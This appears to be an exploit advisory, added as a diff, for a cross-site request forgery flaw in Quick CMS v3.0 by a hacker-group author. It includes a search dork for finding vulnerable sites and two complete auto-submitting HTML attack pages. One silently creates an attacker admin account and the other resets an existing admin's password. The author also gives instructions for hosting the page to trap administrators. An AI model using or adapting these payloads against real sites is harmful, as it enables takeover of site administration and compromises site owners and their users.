@@ -1,0 +1,120 @@
+#(+) Exploit Title: Quick CMS v3.0 Cross Site Request Forgery (Add Admin User)
+#(+) Author    : ^Xecuti0n3r
+#(+) E-mail    : xecuti0n3r()yahoo.com
+#(+) Category  : Web Apps [XSRF]
+#(+) Dork      : intext:"Quick.Cms v3.0" inurl:admin.php
+#(+) Demo CMS Link: http://opensolution.org/Quick.Cms
+
+1               #########################################              1
+0               I'm ^Xecuti0n3r member from Inj3ct0r Team              1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+
+#All you have to do is save the below code as exploit.html
+#Then Host a website with the exploit.html file. A person with admin permissions if visits the site,
+# will automatically add the attacker as Admin without warning ;) 
+____________________________________________________________________
+____________________________________________________________________
+Code:
+ 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+<html>
+<head>
+<title>Quick CMS v3.0 Cross Site Request Forgery (Add Admin User)</title>
+</head>
+
+<body onload="javascript:fireForms()">
+<script language="JavaScript">
+
+function fireForms()
+{
+    var count = 2;
+    var i=0;
+   
+    for(i=0; i<count; i++)
+    {
+        document.forms[i].submit();
+    }
+}
+    
+</script>
+<H2>Quick CMS v3.0 Cross Site Request Forgery (Add Admin User)</H2>
+<form method="POST" name="form0" action="http://site.com/admin.php?p=users-form&iUser=">
+<input type="hidden" name="iUser" value=""/>
+<input type="hidden" name="sLoginOld" value=""/>
+<input type="hidden" name="sOptionList" value="save and go to the list »"/>
+<input type="hidden" name="sLogin" value="admin3"/>
+<input type="hidden" name="sPass" value="admin2"/>
+<input type="hidden" name="sFirstName" value="Admin2"/>
+<input type="hidden" name="sLastName" value="Admin2"/>
+<input type="hidden" name="sCompanyName" value="ZZZZZ"/>
+<input type="hidden" name="sStreet" value="ZZZZZZZZ"/>
+<input type="hidden" name="sZipCode" value="99999"/>
+<input type="hidden" name="sCity" value="ZZZZZZ"/>
+<input type="hidden" name="sPhone" value="9999999993"/>
+<input type="hidden" name="sEmail" value="attacker@jojo.com"/>
+</form>
+</form>
+
+</body>
+</html>
+
+
+EDIT USER:
+
+#All you have to do is save the below code as exploit.html
+#Then Host a website with the exploit.html file. A person with admin permissions if visits the site,
+# will automatically add the attacker as Admin without warning ;) 
+____________________________________________________________________
+____________________________________________________________________
+Code:
+ 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+<html>
+<head>
+<title>Quick CMS v3.0 Cross Site Request Forgery (Edit Existing Admin details)</title>
+</head>
+
+<body onload="javascript:fireForms()">
+<script language="JavaScript">
+
+function fireForms()
+{
+    var count = 2;
+    var i=0;
+    
+    for(i=0; i<count; i++)
+    {
+        document.forms[i].submit();
+    }
+}
+    
+</script>
+<H2>Quick CMS v3.0 Cross Site Request Forgery (Edit Existing Admin details)</H2>
+<form method="POST" name="form0" action="http://site.com/admin.php?p=admins-form">
+<input type="hidden" name="iAdmin" value="1"/>
+<input type="hidden" name="iLastLogin" value="0"/>
+<input type="hidden" name="iBeforeLastLogin" value="0"/>
+<input type="hidden" name="sOptionList" value="save and go to the list ¬ª"/>
+<input type="hidden" name="sLogin" value="demo"/>
+<input type="hidden" name="aPrivilagesForm[p-list]" value="1"/>
+<input type="hidden" name="aPrivilagesForm[p-form]" value="1"/>
+<input type="hidden" name="sPass" value="newpassword"/>
+<input type="hidden" name="sName" value="John Doe"/>
+<input type="hidden" name="sEmail" value="john@doe.com"/>
+<input type="hidden" name="sSignature" value="JD"/>
+</form>
+ </form>
+
+</body>
+</html>
+ 
+########################################################################
+(+)Exploit Coded by: ^Xecuti0N3r 
+(+)Special Thanks to: MaxCaps, d3M0l!tioN3r, aNnIh!LatioN3r
+(+)Gr33ts to : Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com) + All the 31337 Members :)
+(+)<3 to :Indian Cyber Army & Indishell Crew
+########################################################################
